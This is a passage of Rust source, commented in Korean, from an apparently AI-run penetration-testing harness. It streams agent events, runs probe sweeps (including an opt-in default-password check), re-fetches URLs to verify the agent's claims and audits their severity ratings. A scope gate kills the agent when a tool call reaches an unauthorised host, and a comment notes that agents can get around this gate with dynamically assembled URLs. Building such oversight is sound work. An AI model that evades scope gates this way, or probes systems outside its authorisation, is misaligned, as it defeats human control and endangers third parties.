                .find_map(|p| p.get("text").and_then(|t| t.as_str()).map(|s| s.to_string()))
        })
        .or_else(|| {
            r.and_then(|r| r.get("details")).map(|d| {
                if let Some(s) = d.as_str() {
                    s.to_string()
                } else {
                    d.to_string()
                }
            })
        })
        .unwrap_or_default();
    let t = txt.split_whitespace().collect::<Vec<_>>().join(" ");
    let t: String = t.chars().take(160).collect();
    if t.is_empty() {
        String::new()
    } else {
        format!(" — {t}")
    }
}

/// stderr 1줄 표시 여부 — 엔진 내부 소음은 사용자 로그에 올리지 않는다.
/// 단발성 머지 세션(`rc-*-merge`)의 "세션 없음 → 새로 생성" 경고는 매 진단마다
/// 나오는 정상 소음이라 버리고, 워커 연속 세션의 같은 경고는 맥락 유실 신호라 남긴다.
fn stderr_line_visible(line: &str) -> bool {
    let t = line.trim();
    if t.is_empty() {
        return false;
    }
    let low = t.to_lowercase();
    if low.contains("no project session found") && low.contains("creating a new session") {
        return !low.contains("merge");
    }
    for pat in ["deprecat", "npm warn", "experimentalwarning", "trace-warnings"] {
        if low.contains(pat) {
            return false;
        }
    }
    true
}

/// pi/prime-agent json 이벤트 스트림 펌프 — stdout 은 인라인, stderr 는 내부 스레드.
/// pi 1.3.0 json 프로토콜(docs/json.md) 기준. prime-agent 0.10 실측 차이:
///   중첩 text_end 없음(버퍼+message_end 로 회수), 터미널은 agent_end(agent_settled 없음),
///   tool_execution_end 에 isError/durationMs 없음 → result.details.status/durationMs 로 판정.
///   최상위 {"type":"error"} 이벤트는 존재하지 않는다 — 실패는 message_end 의
///   stopReason=error|aborted + errorMessage, stderr, exit 코드로 판단한다.
/// `tool_prefix` 는 툴 노트 표시 ("pi-툴" | "prime-툴"). `enforce` 가 있으면
/// tool_execution_start 마다 scope 를 판정하고 위반 시 자식을 kill 한다.
fn pump_pi_stdio(
    app: &AppHandle,
    id: &str,
    pipes: PiPipes,
    worker: Option<WorkerTag>,
    tool_prefix: &str,
    enforce: Option<ScopeEnforce>,
    report_tag: Option<&str>,
) -> PumpOutcome {
    let PiPipes { out, err } = pipes;
    // stderr → [sys] 노트(모델/스코프 로그·print 모드 오류). 엔진 내부 소음은 걸러낸다.
    let err_handle = {
        let app = app.clone();
        let id = id.to_string();
        let worker = worker.clone();
        thread::spawn(move || {
            for line in err.lines().map_while(Result::ok) {
                if !stderr_line_visible(&line) {
                    continue;
                }
                emit_note(&app, &id, format!("[sys] {}", line.trim()), worker.as_ref());
            }
        })
    };

    let mut outcome = PumpOutcome {
        text: String::new(),
        failed: false,
        aborted: false,
        settled: false,
        blocked: false,
        error: String::new(),
    };
    let mut buf = String::new();
    let mut last_text: Option<String> = None; // text_end/message_end 중복 노트 방지
    // 업스트림 프로토콜 변경 조기 감지 — 모르는 이벤트 종류를 세어 마지막에 1회 보고한다.
    let mut unknown_types: HashMap<String, u64> = HashMap::new();
    // 결과측 탐지 — 이미 경고한 호스트 (실행당 5종 상한).
    let mut result_warned: HashSet<String> = HashSet::new();
    for line in out.lines().map_while(Result::ok) {
        let line = line.trim();
        if line.is_empty() {
            continue;
        }
        let ev: Value = serde_json::from_str(line).unwrap_or_else(|_| json!({ "raw": line }));
        let ty = ev.get("type").and_then(|t| t.as_str()).unwrap_or("");
        match ty {
            "tool_execution_start" => {
                let name = ev.get("toolName").and_then(|n| n.as_str()).unwrap_or("tool");
                let args_val = ev.get("args").cloned().unwrap_or(Value::Null);
                let a = args_val.to_string();
                let a = a.chars().take(120).collect::<String>();
                emit_note(app, id, format!("[{tool_prefix}] {name} {a}"), worker.as_ref());
                // 반응형 스코프 게이트 (prime-agent 엔진): 위반이면 즉시 kill.
                if let Some(enf) = enforce.as_ref() {
                    if !outcome.blocked {
                        if let Some(reason) = decide_tool_violation(&enf.auth, name, &args_val) {
                            let killed = app
                                .state::<Procs>()
                                .0
                                .lock()
                                .unwrap()
                                .get_mut(&enf.proc_key)
                                .map(|c| {
                                    kill_engine_child(c);
                                    true
                                })
                                .unwrap_or(false);
                            outcome.failed = true;
                            outcome.blocked = true;
                            emit_note(
                                app,
                                id,
                                format!("[차단] {reason} (프로세스 중단{}).", if killed { "됨" } else { " 시도" }),
                                worker.as_ref(),
                            );
                        }
                    }
                }
            }
            "tool_execution_end" => {
                let name = ev.get("toolName").and_then(|n| n.as_str()).unwrap_or("tool");
                let (is_err, dur) = tool_end_status(&ev);
                let summary = tool_result_summary(&ev);
                let mark = if is_err { "✗" } else { "✓" };
                emit_note(app, id, format!("[{tool_prefix}{mark}] {name}{dur}{summary}"), worker.as_ref());
                // 결과측 탐지 (반응형 게이트): 결과에 인가 밖 호스트가 나오면 경고만.
                // 동적 URL(f-string 조립 등)로 요청 게이트를 우회한 접촉의 사후망이다.
                if let Some(enf) = enforce.as_ref() {
                    if result_warned.len() < 5 {
                        let body = ev.get("result").map(|r| r.to_string()).unwrap_or_default();
                        for h in out_of_scope_hosts_in_text(&body, &enf.auth) {
                            if result_warned.len() >= 5 {
                                break;
                            }
                            if result_warned.insert(h.clone()) {
                                emit_note(
                                    app,
                                    id,
                                    format!("[경고] 결과에서 인가 밖 접촉 흔적 — {h} (동적 URL 우회 가능성에 대한 신호, 차단은 아님)"),
                                    worker.as_ref(),
                                );
                            }
                        }
                    }
                }
            }
            "message_update" => {
                if let Some(ae) = ev.get("assistantMessageEvent") {
                    match ae.get("type").and_then(|t| t.as_str()) {
                        Some("text_delta") => {
                            if let Some(d) = ae.get("delta").and_then(|d| d.as_str()) {
                                buf.push_str(d);
                            }
                        }
                        Some("text_end") => {
                            // pi 권장: text_end 의 authoritative content 를 우선 사용하고,
                            // 없으면 누적 버퍼로 폴백한다 (provider 정정 반영).
                            let authoritative = ae.get("content").and_then(|c| c.as_str()).unwrap_or("").trim();
                            let b = if authoritative.is_empty() { buf.clone() } else { authoritative.to_string() };
                            flush_assistant_text(app, id, &b, worker.as_ref(), &mut outcome, &mut last_text, report_tag);
                            buf.clear();
                        }
                        _ => {}
                    }
                }
            }
            "message_end" => {
                if let Some(m) = ev.get("message") {
                    match m.get("stopReason").and_then(|r| r.as_str()) {
                        Some("error") => {
                            outcome.failed = true;
                            let msg = m
                                .get("errorMessage")
                                .and_then(|e| e.as_str())
                                .unwrap_or("pi 요청 실패")
                                .to_string();
                            outcome.error = msg.clone();
                            // 이미 충분한 텍스트를 받았으면 오류가 아니라 주의로만 알린다 —
                            // 받은 내용까지 발행하므로 사용자를 놀라게 하지 않는다.
                            if has_usable_text(&outcome) {
                                emit_note(app, id, format!("[sys] 주의: {msg} — 받은 내용까지 사용합니다."), worker.as_ref());
                            } else {
                                emit_note(app, id, format!("[오류] {msg}"), worker.as_ref());
                            }
                        }
                        Some("aborted") => {
                            outcome.aborted = true;
                            emit_note(app, id, "[중지] pi 실행이 중단됐습니다.".to_string(), worker.as_ref());
                        }
                        Some("length") => {
                            // 출력 길이 제한으로 잘림 — 잘린 리포트를 정상으로 오인하지 않게 경고한다.
                            emit_note(
                                app,
                                id,
                                "[sys] 주의: AI 응답이 길이 제한으로 잘렸을 수 있습니다 — 리포트 끝부분이 비었으면 다시 실행하세요.".to_string(),
                                worker.as_ref(),
                            );
                        }
                        _ => {}
                    }
                    if m.get("role").and_then(|r| r.as_str()) == Some("assistant") {
                        if let Some(content) = m.get("content").and_then(|c| c.as_array()) {
                            for part in content {
                                if part.get("type").and_then(|t| t.as_str()) == Some("text") {
                                    if let Some(t) = part.get("text").and_then(|t| t.as_str()) {
                                        flush_assistant_text(app, id, t, worker.as_ref(), &mut outcome, &mut last_text, report_tag);
                                    }
                                }
                            }
                        }
                    }
                }
            }
            "agent_settled" => {
                outcome.settled = true;
                if ev.get("aborted").and_then(|v| v.as_bool()).unwrap_or(false) {
                    outcome.aborted = true;
                    emit_note(app, id, "[중지] 실행이 중단됐습니다.".to_string(), worker.as_ref());
                }
            }
            "agent_end" => {
                // prime-agent 0.10 터미널 이벤트 (agent_settled 를 보내지 않음 — 실측).
                outcome.settled = true;
            }
            "error" => {
                // 레거시 폴백 — 현 프로토콜에 최상위 error 는 없지만 무시하지 않는다.
                outcome.failed = true;
                let text = ev.get("error").and_then(|e| e.as_str()).unwrap_or("pi 오류").to_string();
                outcome.error = text.clone();
                emit_note(app, id, format!("[오류] {text}"), worker.as_ref());
            }
            // 알려진 무시 이벤트(세션 헤더·턴 경계·usage 등)는 조용히 넘긴다.
            "session" | "agent_start" | "turn_start" | "turn_end" | "message_start"
            | "thinking_delta" | "thinking_end" | "tool_execution_update" | "compaction_start"
            | "compaction_end" | "auto_retry" | "usage" | "queue_update" | "toolcall_start"
            | "toolcall_end" => {}
            other => {
                // 진짜로 모르는 이벤트만 계수 — 업스트림 프로토콜 변경 조기 감지용.
                let key = if other.is_empty() { "(빈 type)" } else { other };
                *unknown_types.entry(key.to_string()).or_insert(0) += 1;
            }
        }
    }
    if !buf.trim().is_empty() {
        let b = buf.clone();
        flush_assistant_text(app, id, &b, worker.as_ref(), &mut outcome, &mut last_text, report_tag);
    }
    if !unknown_types.is_empty() {
        let mut kinds: Vec<(&String, &u64)> = unknown_types.iter().collect();
        kinds.sort_by(|a, b| b.1.cmp(a.1));
        let desc = kinds.iter().take(5).map(|(k, n)| format!("{k}×{n}")).collect::<Vec<_>>().join(", ");
        emit_note(
            app,
            id,
            format!("[sys] 참고: 엔진이 보낸 새 형식 이벤트 {desc} — 무시하고 진행했습니다. pi/prime-agent 를 업데이트했다면 RedCell 호환 확인이 필요할 수 있습니다 (engines.json)."),
            worker.as_ref(),
        );
    }
    let _ = err_handle.join();
    outcome
}

/// 실행 전 공통 검증 — 세션/프로바이더/실행중복/redcell 경로.
fn engagement_precheck(app: &AppHandle, id: &str) -> Result<(Session, Settings, String, String), String> {
    let s = read_session(app, id).ok_or("세션을 찾을 수 없습니다")?;
    // 프로바이더 설정 없으면 거부 — mock 은 제거됨(데스크톱은 명시적 설정만).
    let provider = s.provider.trim();
    if provider.is_empty() || provider == "mock" {
        return Err("provider 가 설정되지 않았습니다 — 설정(⚙) > 프로바이더에서 API 키/연결을 설정하세요.".into());
    }
    let provider = provider.to_string();
    // 앱이 죽었다 다시 켜진 경우 등: 상태가 running 이어도 실제 실행 프로세스가 없으면
    // 재실행을 허용한다(레지스트리 기준 — 워커 키 `{id}#w{n}` 포함).
    let truly_running = app
        .state::<Procs>()
        .0
        .lock()
        .unwrap()
        .keys()
        .any(|k| k == id || k.starts_with(&format!("{id}#")));
    if s.status == "running" && truly_running {
        return Err("이미 실행 중인 세션입니다".into());
    }
    let settings = get_settings(app.clone());
    let redcell = settings.redcell_dir.clone();
    // redcell 경로(-e 확장 로드용)는 pi 엔진에서만 필수. prime-agent 는 스킬 주입이라 불필요.
    if session_engine(&s) == Engine::Pi
        && (redcell.trim().is_empty() || !Path::new(&redcell).join("src/cli.ts").exists())
    {
        return Err(format!(
            "redcell 경로를 찾을 수 없습니다: '{redcell}'. 설정(⚙)에서 redcell_dir 을 지정하세요."
        ));
    }
    Ok((s, settings, redcell, provider))
}

/// 기본 점검(P0) 실행 + 증거 저장 + 상태 이벤트 — 정밀/단일 진단 공용.
/// 점검 실패(대상 다운 등)해도 빈 증거로 계속 진행한다 (AI 자체 살펴보기로 보완).
fn run_p0_sweep(app: &AppHandle, id: &str, host: &str, port: Option<u16>, cookie: &str, danger: bool) -> probes::ProbeReport {
    let ev = json!({ "type": "worker_status", "worker": "p0", "label": "기본 점검", "title": "기본 점검", "state": "running" });
    let stamped = append_event(app, id, &ev);
    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
    emit_note(app, id, "[sys] 기본 점검 시작 — 수백 가지 기본 항목을 자동으로 확인합니다.".to_string(), None);
    if danger {
        let ev = json!({ "type": "note", "text": "[경고] 위험 검사 실행 중 — 흔한 초기 비밀번호·옆 번호 정보·임시 파일 만들기 (동의하셨습니다)" });
        let stamped = append_event(app, id, &ev);
        app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
    }
    let mut cfg = probes::SweepConfig::default();
    if !cookie.trim().is_empty() {
        cfg.cookie = Some(cookie.trim().to_string());
    }
    cfg.danger = danger;
    let rep = probes::run_sweep_with_config(host, port, cfg);
    // 증거 전문 저장 (세션당 최신 1건).
    {
        let guard = app.state::<IoGuard>();
        let _lock = guard.0.lock().unwrap();
        let p = sessions_dir(app).join(format!("probe-{id}.json"));
        if let Ok(txt) = serde_json::to_string_pretty(&rep) {
            fs::write(p, txt).ok();
        }
    }
    let line = probes::sweep_summary_line(&rep);
    let ev = json!({ "type": "note", "text": line });
    let stamped = append_event(app, id, &ev);
    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
    let ev = json!({ "type": "worker_status", "worker": "p0", "label": "기본 점검", "title": "기본 점검", "state": "done" });
    let stamped = append_event(app, id, &ev);
    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
    rep
}

/// P0 증거 주입 블록 — 워커/collector/단일 진단 지시문 끝에 덧붙인다.
fn p0_evidence_block(rep: &probes::ProbeReport, cap_chars: usize) -> String {
    let chains = probes::chain_hints(&rep.hits);
    let chain_sec = if chains.is_empty() {
        String::new()
    } else {
        format!("\n\n### 체인 단서 (공격 시나리오 씨앗 — ID 인용)\n{}", chains.join("\n"))
    };
    // 커버리지 원장 — '점검 범위·한계' 섹션을 추측이 아닌 사실로 채우는 근거.
    let cov = probes::coverage_digest(rep, 4000);
    let cov_sec = if cov.trim().is_empty() {
        String::new()
    } else {
        format!(
            "\n\n## 점검 커버리지·미검증 인계 (P0 실측 원장)\n{cov}\n규칙: out_of_scope·blocked·deferred 단위는 **검사하지 않은 것**이다. 리포트 '한계·미검증 영역' 섹션에 그대로 옮겨 적고, 해당 항목을 '점검 완료'로 쓰지 마라."
        )
    };
    format!(
        "\n\n## P0 자동 스윕 증거 (실측 확정 — ID 인용 필수)\n{}\n규칙: 위 [P-###] 증거는 확정 실측이다. 관련 시나리오에 ID를 반드시 인용하고, 이미 커버된 항목은 재프로브하지 말고 체인·악용 추론과 빈틈 보완에 집중하라.{chain_sec}{cov_sec}",
        probes::evidence_digest(rep, cap_chars)
    )
}

/// pi 연속대화 세션 id 보장 (run_prime·deep 공용).
fn ensure_piq(app: &AppHandle, s: &Session) -> Session {
    if !s.piq.trim().is_empty() {
        return s.clone();
    }
    let mut s2 = s.clone();
    let id8 = s2.id.chars().take(8).collect::<String>();
    s2.piq = format!("rc-{id8}");
    write_session_locked(app, &s2);
    s2
}

/// 대상 URL 조합 (포트 → http/https).
fn target_url(host: &str, port: Option<u16>) -> String {
    match port {
        Some(p) if p == 443 || p == 8443 => format!("https://{host}/"),
        Some(p) => format!("http://{host}:{p}/"),
        None => format!("http://{host}/"),
    }
}

fn https_hint_for(host: &str, port: Option<u16>) -> String {
    match port {
        Some(p) if p != 443 && p != 8443 => {
            format!("https://{host}:{p}/ 로도 접속을 시도해볼 것(둘 다 확인).")
        }
        _ => String::new(),
    }
}

/// 리포트 병합 1회 실행 — 1차·최종 공용.
/// `report_tag`("early"|"final")는 결과 탭의 1차/최종 구분 표식이다.
#[allow(clippy::too_many_arguments)]
/// 워커 구조화 발견 선독 — findings JSON 을 읽어 병합 프롬프트에 붙인다.
/// 파일이 없으면 빈 문자열 (워커 텍스트 출력 폴백). 디렉터리 주입형이라 테스트 가능.
fn collect_findings_block_in_dirs(
    prime_id_dir: &Path,
    sess_dir: &Path,
    engine: Engine,
    piq: &str,
) -> String {
    let mut files: Vec<(String, PathBuf)> = Vec::new();
    if engine == Engine::Prime {
        for def in DEEP_WORKERS {
            files.push((
                format!("{} ({})", def.id, def.label),
                prime_id_dir.join(def.id).join("work").join(findings_filename(def.id)),
            ));
        }
    } else {
        let prefix = format!("findings-{piq}-");
        if let Ok(rd) = fs::read_dir(sess_dir) {
            let mut names: Vec<String> = rd
                .flatten()
                .filter_map(|e| e.file_name().into_string().ok())
                .filter(|n| n.starts_with(&prefix) && n.ends_with(".json"))
                .collect();
            names.sort();
            for n in names {
                files.push((n.clone(), sess_dir.join(n)));
            }
        }
    }
    let mut parts: Vec<String> = Vec::new();
    let mut total = 0usize;
    for (label, path) in files {
        if total >= 6000 {
            break;
        }
        let Ok(raw) = fs::read_to_string(&path) else { continue };
        let raw = raw.trim();
        if raw.is_empty() {
            continue;
        }
        let parsed_ok = serde_json::from_str::<Value>(raw).is_ok();
        let clipped: String = raw.chars().take(1500).collect();
        total += clipped.len();
        parts.push(format!("--- {label} [{}] ---\n{clipped}", if parsed_ok { "JSON 파싱됨" } else { "파싱 실패 — 원문 참고" }));
    }
    if parts.is_empty() {
        return String::new();
    }
    format!(
        "\n\n## 워커 구조화 발견 (findings JSON — 텍스트 출력보다 우선 병합)\n아래는 각 워커가 저장한 발견 JSON 이다. 텍스트 출력과 모순되면 JSON 을 우선하고,\n빠진 등급·증거는 텍스트에서 보완한다.\n\n{}",
        parts.join("\n\n")
    )
}

fn collect_findings_block(app: &AppHandle, id: &str, engine: Engine, piq: &str) -> String {
    collect_findings_block_in_dirs(&root(app).join("prime-sessions").join(id), &sessions_dir(app), engine, piq)
}

/// 기계 대조 — [실증] 자기채점의 기계망. 주장 URL 을 하네스가 직접 재요청해
/// 증거 발췌 출현을 확인하고, 존재하지 않는 [P-###] 인용(환각)을 검출한다.
#[derive(Debug, Clone)]
enum ClaimVerdict {
    Confirmed,
    Mismatch(String),
    Skipped(String),
}

#[derive(Debug, Clone)]
struct ClaimCheck {
    route: String,
    url: String,
    verdict: ClaimVerdict,
    /// 실제 재요청한 횟수 (후보 URL 중 시도한 것).
    tried: usize,
}

#[derive(Debug, Default)]
struct VerifyReport {
    checks: Vec<ClaimCheck>,
    unknown_ids: Vec<String>,
    /// 위험도 대조 감사 결과 — 리포트 주장 위험도 ↔ P0 근거 최대 심각도.
    severity: Vec<SeverityAudit>,
}

/// 심각도 대조 감사 — 리포트가 주장한 위험도를 P0 실측 근거와 기계 대조한다.
/// 워커가 '치명'이라 써도 근거 P-ID 최대 심각도가 medium 이면 과대(over) 로 강등한다.
/// kind: "over"(과대 — 반드시 낮춰야 함) | "under"(과소 — 위험 은폐, 정보성)
///      | "no-evidence"(비교 근거 없음, 정보성).
#[derive(Debug, Clone, PartialEq, Eq)]
struct SeverityAudit {
    /// 루트 식별 문자열(헤딩 원문).
    route: String,
    /// 리포트가 주장한 위험도 — "치명"|"높음"|"중간"|"낮음".
    claimed: String,
    /// 인용된 유효 P-ID 중 최대 엔진 심각도("critical".."info") — 없으면 None.
    evidence_max: Option<String>,
    kind: &'static str,
}

/// 주장 위험도 랭크 — 치명 4 > 높음 3 > 중간 2 > 낮음 1 (정보 0).
fn claimed_sev_rank(s: &str) -> Option<u8> {
    match s {
        "치명" => Some(4),
        "높음" => Some(3),
        "중간" => Some(2),
        "낮음" => Some(1),
        "정보" => Some(0),
        _ => None,
    }
}

/// 엔진 심각도 랭크 — critical 4 > high 3 > medium 2 > low 1 > info 0.
fn engine_sev_rank(s: &str) -> Option<u8> {
    match s {
        "critical" => Some(4),
        "high" => Some(3),
        "medium" => Some(2),
        "low" => Some(1),
        "info" => Some(0),
        _ => None,
    }
}

/// 엔진 심각도 → 리포트 위험도 표기 — 병합자가 그대로 옮겨 적을 수 있게.
/// "정보" 는 리포트 위험도 4급(치명·높음·중간·낮음) 밖이라 최하위 '낮음' 으로 옮긴다.
fn engine_sev_ko(s: &str) -> &'static str {
    match s {
        "critical" => "치명",
        "high" => "높음",
        "medium" => "중간",
        _ => "낮음",
    }
}

/// 루트별 위험도 감사 — 주장 위험도와 인용 P-ID 근거의 최대 심각도를 대조.
/// - over: 주장이 근거보다 높음 → 반드시 낮춰야 함(강등 지시 대상).
/// - under: 주장이 근거보다 낮음 → 위험 은폐(정보성).
/// - no-evidence: 인용 P-ID 가 없어 비교 불가(정보성 — 웹 실측 시나리오는 정상).
/// 존재하지 않는 P-ID 인용은 여기서는 무시한다(환각 처리는 unknown_p_ids 가 담당).
/// 일치(exact)·주장 등급 미인식은 감사 건으로 남기지 않는다.
fn audit_claim_severities(claims: &[RootClaim], evidence: &HashMap<String, String>) -> Vec<SeverityAudit> {
    let mut out: Vec<SeverityAudit> = Vec::new();
    for c in claims {
        // 인용 중 실제 근거로 존재하는 것만 — 존재하지 않는 인용은 무시.
        let cited: Vec<&String> = c.p_ids.iter().filter(|id| evidence.contains_key(*id)).collect();
        if cited.is_empty() {
            out.push(SeverityAudit {
                route: c.route.clone(),
                claimed: c.severity.clone(),
                evidence_max: None,
                kind: "no-evidence",
            });
            continue;
        }
        let mut max_rank: Option<u8> = None;
        let mut max_sev = String::new();
        for id in cited {
            let sev = &evidence[id];
            let r = engine_sev_rank(sev).unwrap_or(0);
            if max_rank.map_or(true, |m| r > m) {
                max_rank = Some(r);
                max_sev = sev.clone();
            }
        }
        let Some(e_rank) = max_rank else { continue };
        // 주장 등급이 미인식(빈 값 등)이면 비교 대상이 아니다.
        let Some(c_rank) = claimed_sev_rank(&c.severity) else { continue };
        if c_rank == e_rank {
            continue; // 일치 — 위반 없음.
        }
        let kind = if c_rank > e_rank { "over" } else { "under" };
        out.push(SeverityAudit {
            route: c.route.clone(),
            claimed: c.severity.clone(),
            evidence_max: Some(max_sev),
            kind,
        });
    }
    out
}

fn url_host(url: &str) -> Option<String> {
    let rest = url.split_once("://")?.1;
    let hostport = rest.split('/').next()?;
    if let Some(b) = hostport.strip_prefix('[') {
        b.split(']').next().map(|h| h.to_lowercase())
    } else {
        hostport.split(':').next().map(|h| h.to_lowercase())
    }
}

fn url_scheme(url: &str) -> Option<&str> {
    let s = url.split_once("://")?.0;
    if s == "http" || s == "https" {
        Some(s)
    } else {
        None
    }
}

/// URL 포트 — 명시 `:port` 우선, 없으면 스킴 기본값(https 443/http 80).
fn url_port(url: &str) -> Option<u16> {
    let rest = url.split_once("://")?.1;
    let hostport = rest.split('/').next()?;
    let (_, explicit) = split_host_port(hostport);
    explicit.or(match url_scheme(url) {
        Some("https") => Some(443),
        Some("http") => Some(80),
        _ => None,
    })
}

/// 동일 호스트 절대화 — Location 이 상대경로면 base 와 결합, 절대는 호스트 일치 시만.
fn absolutize_same_host(base: &str, loc: &str) -> Option<String> {
    let loc = loc.trim();
    if loc.starts_with('/') && !loc.starts_with("//") {
        let scheme = url_scheme(base)?;
        // 포트 보존 — base 의 host:port 를 살린다.
        let rest = base.split_once("://")?.1;
        let hostport = rest.split('/').next()?;
        return Some(format!("{scheme}://{hostport}{loc}"));
    }
    if url_scheme(loc).is_some() {
        if url_host(loc) == url_host(base) {
            return Some(loc.to_string());
        }
    }
    None
}

/// 대조 재요청 — GET 1회 + 동일 호스트 리다이렉트 1홉, 8초·200KB 상한.
fn verify_fetch(url: &str, cookie: &str) -> Result<(u16, String, String), String> {
    let agent: ureq::Agent = ureq::AgentBuilder::new()
        .timeout_connect(std::time::Duration::from_secs(8))
        .timeout_read(std::time::Duration::from_secs(8))
        .timeout_write(std::time::Duration::from_secs(8))
        .redirects(0)
        .user_agent("Mozilla/5.0 (RedCell authorized-agent; verify)")
        .build();
    let mut target = url.to_string();
    for _ in 0..2 {
        let mut req = agent.get(&target);
        if !cookie.trim().is_empty() {
            req = req.set("Cookie", cookie.trim());
        }
        let resp = match req.call() {
            Ok(r) => r,
            Err(ureq::Error::Status(_, r)) => r,
            Err(e) => return Err(e.to_string()),
        };
        let status = resp.status();
        if (300..400).contains(&status) {
            let loc = resp.header("Location").unwrap_or("").to_string();
            if let Some(next) = absolutize_same_host(&target, &loc) {
                target = next;
                continue;
            }
            return Err(format!("리다이렉트 추적 불가 ({status})"));
        }
        let mut hs = String::new();
        for name in resp.headers_names() {
            for v in resp.all(&name) {
                hs.push_str(&format!("{name}: {v}\n"));
            }
        }
        let mut buf = Vec::new();
        resp.into_reader()
            .take(200_000)
            .read_to_end(&mut buf)
            .map_err(|e| e.to_string())?;
        return Ok((status, hs, String::from_utf8_lossy(&buf).into_owned()));
    }
    Err("리다이렉트 과다".into())
}

/// 기계 대조 — 주장 URL 재요청 + 환각 P-ID 검출 + 위험도 대조.
/// `evidence` 는 검증 대상 ID 맵(P-ID → 엔진 심각도) — 스윕 결과(sweep.hits)에서 만든다.
/// 맵의 키가 유효 P-ID 집합이 된다.
fn verify_report_claims(
    text: &str,
    evidence: &HashMap<String, String>,
    auth: &auth::AuthList,
    cookie: &str,
) -> VerifyReport {
    let valid_ids: HashSet<String> = evidence.keys().cloned().collect();
    let unknown_ids = unknown_p_ids(text, &valid_ids);
    let mut checks = Vec::new();
    for c in extract_evidence_claims(text) {
        // 후보 URL 을 순서대로 시도 — 하나라도 증거를 재현하면 [실증] 을 유지한다.
        // (루트에 진입점·재현 curl 이 둘 이상 있으면 한쪽만 재요청해 오등급되지 않도록)
        let mut candidates = vec![c.url.clone()];
        candidates.extend(c.alt_urls.iter().cloned());
        let mut verdict: Option<ClaimVerdict> = None;
        let mut tried = 0usize;
        for url in &candidates {
            let host = url_host(url);
            match host {
                None => {
                    verdict = Some(ClaimVerdict::Skipped("URL 파싱 불가".into()));
                }
                Some(_) if url_scheme(url).is_none() => {
                    verdict = Some(ClaimVerdict::Skipped("http(s) 아님".into()));
                }
                Some(h) if !auth::is_host_port_allowed(auth, &h, url_port(url)) => {
                    verdict = Some(ClaimVerdict::Skipped("인가 밖 URL".into()));
                }
                Some(_) => {
                    tried += 1;
                    match verify_fetch(url, cookie) {
                        Err(e) => {
                            verdict = Some(ClaimVerdict::Skipped(format!(
                                "재요청 실패: {}",
                                e.chars().take(80).collect::<String>()
                            )));
                        }
                        Ok((st, hs, body)) => {
                            if excerpt_matches(&body, &hs, &c.excerpt) {
                                verdict = Some(ClaimVerdict::Confirmed);
                                break;
                            }
                            verdict = Some(ClaimVerdict::Mismatch(format!("HTTP {st} — 발췌 미출현")));
                        }
                    }
                }
            }
        }
        let verdict = verdict.unwrap_or_else(|| ClaimVerdict::Skipped("재요청 대상 없음".into()));
        checks.push(ClaimCheck { route: c.route, url: c.url, verdict, tried });
    }
    let severity = audit_claim_severities(&extract_root_claims(text), evidence);
    VerifyReport { checks, unknown_ids, severity }
}

fn verify_report_block(rep: &VerifyReport) -> String {
    if rep.checks.is_empty() && rep.unknown_ids.is_empty() && rep.severity.is_empty() {
        return String::new();
    }
    let mut lines = vec!["\n\n## 기계 대조 결과 (하네스 실측 — 병합 규칙 4·9 적용)".to_string()];
    for c in &rep.checks {
        let mark = match &c.verdict {
            ClaimVerdict::Confirmed => "확인".to_string(),
            ClaimVerdict::Mismatch(w) => format!("불일치 ({w})"),
            ClaimVerdict::Skipped(w) => format!("미시도 ({w})"),
        };
        lines.push(format!("- [{mark}] {} — {}", c.route.chars().take(60).collect::<String>(), c.url));
    }
    if !rep.unknown_ids.is_empty() {
        lines.push(format!("- [환각 P-ID] 존재하지 않는 인용: {} — 삭제할 것", rep.unknown_ids.join(", ")));
    }
    // 심각도 대조 — 위험도 과대(강등 지시)·과소(위험 은폐)·근거 없음.
    if !rep.severity.is_empty() {
        lines.push(String::new());
        lines.push("### 심각도 대조 (주장 위험도 ↔ P0 근거 최대 심각도)".to_string());
        for a in &rep.severity {
            let route = a.route.chars().take(60).collect::<String>();
            let ev = a.evidence_max.as_deref().unwrap_or("");
            match a.kind {
                "over" => {
                    let target = engine_sev_ko(ev);
                    lines.push(format!(
                        "- [심각도 과대] {route} — 위험도: {} (근거 최대 심각도 {ev}) → 위험도를 {} 으로 낮출 것",
                        a.claimed, target
                    ));
                }
                "under" => {
                    lines.push(format!(
                        "- [심각도 과소] {route} — 위험도: {} (근거 최대 심각도 {ev}) → 위험도를 올릴 것(위험 은폐)",
                        a.claimed
                    ));
                }
                _ => {
                    lines.push(format!("- [심각도 근거없음] {route} — P-ID 인용 없음(비교 불가)"));
                }
            }
        }
    }
    lines.join("\n")
}

fn verify_note_line(rep: &VerifyReport) -> String {
    let cf = rep.checks.iter().filter(|c| matches!(c.verdict, ClaimVerdict::Confirmed)).count();
    let mm = rep.checks.iter().filter(|c| matches!(c.verdict, ClaimVerdict::Mismatch(_))).count();
    let sk = rep.checks.len() - cf - mm;
    let mut s = format!("[sys] 기계 대조 끝 — 주장 {}건 중 확인 {}건·불일치 {}건·미시도 {}건", rep.checks.len(), cf, mm, sk);
    if !rep.unknown_ids.is_empty() {
        s.push_str(&format!(" · 환각 P-ID {}건({})", rep.unknown_ids.len(), rep.unknown_ids.join(",")));
    }
    if !rep.severity.is_empty() {
        let ov = rep.severity.iter().filter(|a| a.kind == "over").count();
        let un = rep.severity.iter().filter(|a| a.kind == "under").count();
        let ne = rep.severity.len() - ov - un;
        s.push_str(&format!(" · 심각도 대조 {}건(과대 {ov}·과소 {un}·근거없음 {ne})", rep.severity.len()));
    }
    s.push('.');
    s
}

fn run_collector_merge(
    app: &AppHandle,
    id: &str,
    engine: Engine,
    settings: &Settings,
    provider: &str,
    redcell: &str,
    run_tag: &str,
    instruction: String,
    proc_key: &str,
    report_tag: &str,
    label: &str,
    piq: &str,
) -> PumpOutcome {
    // 구조화 선독 — findings JSON 이 있으면 병합 프롬프트에 덧붙인다.
    let block = collect_findings_block(app, id, engine, piq);
    let mut instruction = if block.is_empty() { instruction } else { format!("{instruction}{block}") };
    // 자율 병합 — 게이트가 검사할 report.md 저장을 지시한다 (prime 전용).
    if engine == Engine::Prime && prime_autonomous_enabled() {
        let work = prime_session_dir(app, id, run_tag).join("work");
        instruction.push_str(&autonomous_report_block(&work));
    }
    match prepare_engine_run(app, id, engine, settings, provider, redcell, run_tag, instruction, true) {
        Ok(prep) => match spawn_prepared(&prep, provider, settings) {
            Ok((child, pipes)) => {
                app.state::<Procs>().0.lock().unwrap().insert(proc_key.to_string(), child);
